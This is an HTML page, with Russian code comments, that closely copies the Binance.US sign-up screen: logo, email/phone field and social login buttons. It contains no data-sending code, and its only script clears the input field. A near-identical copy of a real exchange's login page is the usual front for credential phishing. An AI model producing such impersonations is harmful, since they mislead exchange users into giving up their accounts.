<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Binance</title>

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">

    <!-- Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: #ffffff;
            display: flex;
            margin-top: 52px;
            justify-content: center;
            align-items: center;
            padding: 24px;
            position: relative;
        }

        .container {
            width: 425px;
            height: 649px;
            background: #fff;
            border-radius: 24px;
            padding: 40px;
            border: 1px solid #eaecef;
            position: relative;
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            margin-bottom: 30px;
        }

        .logo-icon {
            width: 40px;
            height: 40px;
            margin-right: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-icon .binance-logo {
            width: 32px;
            height: 28px;
        }

        .logo-text {
            font-size: 22px;
            font-weight: 700;
            color: rgb(240, 185, 11);
        }

        .title {
            text-align: left;
            font-size: 26px;
            font-weight: 600;
            margin-bottom: 40px;
            color: #1e2329;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 6px;
            color: #1e2329;
            display: block;
        }

        .input-wrapper {
            position: relative;
        }

        .form-input {
            width: 100%;
            height: 51px;
            padding: 10px 14px;
            padding-right: 40px; /* Добавляем отступ для крестика */
            font-size: 14px;
            border: 1px solid #d0d5dd;
            border-radius: 11px;
            color: #1e2329;
            outline: none;
            transition: border 0.2s;
        }

        .form-input:focus {
            border-color: #f0b90b;
        }

        .clear-btn {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            width: 20px;
            height: 20px;
            color: #999;
            display: none;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            transition: color 0.2s;
        }

        .clear-btn:hover {
            color: #666;
        }

        .clear-btn.show {
            display: flex;
        }

        .checkbox {
            display: flex;
            align-items: flex-start;
            gap: 8px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #5e6673;
        }

        .checkbox input {
            margin-top: 3px;
            accent-color: #f0b90b;
        }

        .checkbox a {
            color: #f0b90b;
            text-decoration: none;
        }

        .submit-btn {
            width: 100%;
            padding: 12px;
            background-color: #FCD535;
            color: #000;
            font-weight: 500;
            font-size: 14px;
            border: none;
            border-radius: 11px;
            cursor: pointer;
        }

        .divider {
            text-align: center;
            color: #999;
            font-size: 13px;
            margin: 16px 0;
            position: relative;
        }

        .divider::before, .divider::after {
            content: '';
            position: absolute;
            top: 50%;
            width: 40%;
            height: 1px;
            background: #eaecef;
        }

        .divider::before {
            left: 0;
        }

        .divider::after {
            right: 0;
        }

        .social-btn {
            width: 100%;
            height: 48px;
            padding: 10px 14px;
            border: 1px solid #d0d5dd;
            border-radius: 11px;
            background: #fff;
            margin-bottom: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            gap: 8px;
            cursor: pointer;
            position: relative;
        }

        .social-btn i {
            position: absolute;
            left: 16px;
        }

        .footer-links {
            position: absolute;
            bottom: -40px;
            left: 0;
            width: 100%;
            text-align: center;
            font-size: 13px;
            color: #999;
        }

        .footer-links a {
            color: #C99400;
            text-decoration: none;
        }

        .bottom-footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #ffffff;
            padding: 16px 20px;
            display: flex;
            justify-content: center;
            gap: 24px;
            font-size: 12px;
            color: #5e6673;
        }

        .bottom-footer svg {
            width: 16px;
            height: 16px;
            margin-right: -20px;
        }

        .bottom-footer a {
            color: #5e6673;
            text-decoration: none;
        }

        .bottom-footer a:hover {
            color: #1e2329;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">
        <div class="logo-icon">
            <svg viewBox="0 0 126.61 126.61" xmlns="http://www.w3.org/2000/svg" class="binance-logo">
                <g fill="#f3ba2f">
                    <path d="m38.73 53.2 24.59-24.58 24.6 24.6 14.3-14.31-38.9-38.91-38.9 38.9z"/>
                    <path d="m0 63.31 14.3-14.31 14.31 14.31-14.31 14.3z"/>
                    <path d="m38.73 73.41 24.59 24.59 24.6-24.6 14.31 14.29-38.9 38.91-38.91-38.88z"/>
                    <path d="m98 63.31 14.3-14.31 14.31 14.3-14.31 14.32z"/>
                    <path d="m77.83 63.3-14.51-14.52-10.73 10.73-1.24 1.23-2.54 2.54 14.51 14.5 14.51-14.47z"/>
                </g>
            </svg>
        </div>
        <div class="logo-text">BINANCE.US</div>
    </div>
    <div class="title">Welcome to Binance</div>
    <form>
        <div class="form-group">
            <label class="form-label" for="email">Email/Phone number</label>
            <div class="input-wrapper">
                <input class="form-input" type="text" id="email" placeholder="Email/Phone (without country code)">
                <button type="button" class="clear-btn" id="clearBtn">×</button>
            </div>
        </div>
        <div class="checkbox">
            <input type="checkbox" id="terms">
            <label for="terms">
                By creating an account, I agree to Binance's <a href="#">Terms of Service</a> and <a href="#">Privacy Notice</a>.
            </label>
        </div>
        <button class="submit-btn" type="submit">Next</button>
    </form>
    <div class="divider">or</div>
    <button class="social-btn">
        <span class="custom-svg-icon" style="position: absolute; left: 16px; display: flex; align-items: center; height: 100%;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="-380.2 274.7 65.7 65.8" width="18" height="18">
                <style>
                    .st0{fill:#e0e0e0}.st1{fill:#fff}.st2{clip-path:url(#SVGID_2_);fill:#fbbc05}.st3{clip-path:url(#SVGID_4_);fill:#ea4335}.st4{clip-path:url(#SVGID_6_);fill:#34a853}.st5{clip-path:url(#SVGID_8_);fill:#4285f4}
                </style>
                <circle class="st0" cx="-347.3" cy="307.6" r="32.9"/>
                <circle class="st1" cx="-347.3" cy="307.1" r="32.4"/>
                <g>
                    <defs>
                        <path id="SVGID_1_" d="M-326.3 303.3h-20.5v8.5h11.8c-1.1 5.4-5.7 8.5-11.8 8.5-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4c-3.9-3.4-8.9-5.5-14.5-5.5-12.2 0-22 9.8-22 22s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z"/>
                    </defs>
                    <clipPath id="SVGID_2_">
                        <use xlink:href="#SVGID_1_" overflow="visible"/>
                    </clipPath>
                    <path class="st2" d="M-370.8 320.3v-26l17 13z"/>
                    <defs>
                        <path id="SVGID_3_" d="M-326.3 303.3h-20.5v8.5h11.8c-1.1 5.4-5.7 8.5-11.8 8.5-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4c-3.9-3.4-8.9-5.5-14.5-5.5-12.2 0-22 9.8-22 22s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z"/>
                    </defs>
                    <clipPath id="SVGID_4_">
                        <use xlink:href="#SVGID_3_" overflow="visible"/>
                    </clipPath>
                    <path class="st3" d="M-370.8 294.3l17 13 7-6.1 24-3.9v-14h-48z"/>
                    <g>
                        <defs>
                            <path id="SVGID_5_" d="M-326.3 303.3h-20.5v8.5h11.8c-1.1 5.4-5.7 8.5-11.8 8.5-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4c-3.9-3.4-8.9-5.5-14.5-5.5-12.2 0-22 9.8-22 22s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z"/>
                        </defs>
                        <clipPath id="SVGID_6_">
                            <use xlink:href="#SVGID_5_" overflow="visible"/>
                        </clipPath>
                        <path class="st4" d="M-370.8 320.3l30-23 7.9 1 10.1-15v48h-48z"/>
                    </g>
                    <g>
                        <defs>
                            <path id="SVGID_7_" d="M-326.3 303.3h-20.5v8.5h11.8c-1.1 5.4-5.7 8.5-11.8 8.5-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4c-3.9-3.4-8.9-5.5-14.5-5.5-12.2 0-22 9.8-22 22s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z"/>
                        </defs>
                        <clipPath id="SVGID_8_">
                            <use xlink:href="#SVGID_7_" overflow="visible"/>
                        </clipPath>
                        <path class="st5" d="M-322.8 331.3l-31-24-4-3 35-10z"/>
                    </g>
                </g>
            </svg>
        </span>
        Continue with Google
    </button>
    <button class="social-btn">
        <i class="fab fa-apple" style="position: absolute; left: 20px;"></i>
        Continue with Apple
    </button>
    <button class="social-btn">
        <span class="custom-svg-icon" style="position: absolute; left: 18px; display: flex; align-items: center; height: 100%;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="14" height="14">
                <path fill="#009eeb" d="M477,43.86,13.32,223.29a5.86,5.86,0,0,0-.8.38c-3.76,2.13-30,18.18,7,32.57l.38.14,110.41,35.67a6.08,6.08,0,0,0,5.09-.62L409.25,120.57a6,6,0,0,1,2.2-.83c3.81-.63,14.78-1.81,7.84,7-7.85,10-194.9,177.62-215.66,196.21a6.3,6.3,0,0,0-2.07,4.17l-9.06,108a7.08,7.08,0,0,0,2.83,5.67,6.88,6.88,0,0,0,8.17-.62l65.6-58.63a6.09,6.09,0,0,1,7.63-.39l114.45,83.1.37.25c2.77,1.71,32.69,19.12,41.33-19.76l79-375.65c.11-1.19,1.18-14.27-8.17-22-9.82-8.08-23.72-4-25.81-3.56A6,6,0,0,0,477,43.86Z"/>
            </svg>
        </span>
        Continue with Telegram
    </button>

    <div class="footer-links">
        <a href="#">Sign up as an entity</a> or <a href="login">Log in</a>
    </div>

</div>
<div class="bottom-footer">
    <svg class="bn-svg css-166786i" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M20.6 18.26h-1.545a1 1 0 00-.767.358l-.075.103-.713 1.111-.713-1.111-.075-.103a1 1 0 00-.767-.358H14.4V14.4h6.2v3.86zm-8 .4a1.4 1.4 0 001.4 1.4h1.508l1.15 1.795a1 1 0 001.684 0l1.15-1.794H21a1.4 1.4 0 001.4-1.4V14a1.4 1.4 0 00-1.4-1.4h-7a1.4 1.4 0 00-1.4 1.4v4.66zM12.393 1.957a.9.9 0 011.206.018l.065.065.369.442c1.672 2.093 2.636 4.657 3.075 7.324l.086.572.008.092a.9.9 0 01-1.775.242l-.017-.09-.08-.526c-.401-2.44-1.268-4.694-2.703-6.49l-.317-.378-.056-.072a.9.9 0 01.14-1.199zM11.541 1.905a.9.9 0 00-1.199.128l-.058.073-.341.485C6.52 7.603 6.537 12.38 7.457 15.926a18.078 18.078 0 001.767 4.345c.294.518.56.926.756 1.208.097.14.178.25.235.326l.088.114.006.008.002.003c.001.001.01-.005.562-.451l-.56.452a.9.9 0 101.4-1.13h.001V20.8l-.012-.014-.048-.063a8.804 8.804 0 01-.196-.27 14.141 14.141 0 01-.669-1.07 16.286 16.286 0 01-1.589-3.91c-.813-3.137-.85-7.36 2.233-11.873l.308-.438.05-.077a.9.9 0 00-.25-1.18z" fill="currentColor"></path>
        <path d="M1.644 12.025C1.644 6.268 6.312 1.6 12.07 1.6c4.383 0 9.143 3.146 10.165 8.738a.9.9 0 01-1.77.324C19.61 5.992 15.653 3.4 12.07 3.4a8.625 8.625 0 00-1.107 17.18h.104a.9.9 0 01.348 1.729c-.005.002-.01.007-.015.01a.907.907 0 01-.331.08l-.038.001h-.026a.896.896 0 01-.083-.005l-.044-.003-.05-.006a1.265 1.265 0 01-.121-.026c-5.114-.668-9.063-5.039-9.063-10.335z" fill="currentColor"></path>
        <path d="M20.634 7.67l.091.005a.9.9 0 010 1.79l-.091.006H3.367a.9.9 0 010-1.801h17.267zM10.5 14.53l.092.004a.9.9 0 010 1.791l-.092.005H3.367a.9.9 0 010-1.8H10.5z" fill="currentColor"></path>
    </svg>
    <a href="#">English</a>
    <a href="#">Cookies</a>
    <a href="#">Terms</a>
    <a href="#">Privacy</a>
</div>

<script>
    const emailInput = document.getElementById('email');
    const clearBtn = document.getElementById('clearBtn');

    // Отслеживаем изменения в поле ввода
    emailInput.addEventListener('input', function() {
        if (this.value.length > 0) {
            clearBtn.classList.add('show');
        } else {
            clearBtn.classList.remove('show');
        }
    });

    // Очищаем поле при нажатии на крестик
    clearBtn.addEventListener('click', function() {
        emailInput.value = '';
        clearBtn.classList.remove('show');
        emailInput.focus(); // Возвращаем фокус на поле ввода
    });
</script>
</body>
</html>
